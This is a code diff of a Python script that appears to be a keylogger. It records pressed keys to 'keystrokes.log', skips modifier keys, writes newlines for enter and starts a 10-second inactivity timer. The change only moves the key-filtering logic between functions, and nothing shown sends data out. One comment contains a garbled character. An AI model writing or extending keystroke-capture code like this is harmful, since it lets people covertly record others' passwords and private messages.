@@ -8,8 +8,14 @@ no_keystrokes = None
 
 def write_to_file(key):
     if key is not None:
-        with open("keystrokes.log", "a") as file:
-            file.write(key)
+        if key == "alt" or key == "shift" or key == "ctrl":
+            pass
+        elif key == "enter":
+            with open("keystrokes.log", "a") as file:
+                file.write("\n")
+        else:
+            with open("keystrokes.log", "a") as file:
+                file.write(key)
     else:
         print("key is none")
 
@@ -31,12 +37,7 @@ def on_press(key):
         # print(f"Spec²ial key {key} pressed")
         key_str = str(key).replace("Key.", "")
     
-    if key_str == "alt" or key_str == "shift" or key_str == "ctrl":
-        pass
-    elif key_str == "enter":
-        write_to_file("\n")
-    else:
-        write_to_file(key_str)
+    write_to_file(key_str)
     
     no_keystrokes = Timer(10, write_inactivity)
     no_keystrokes.start()
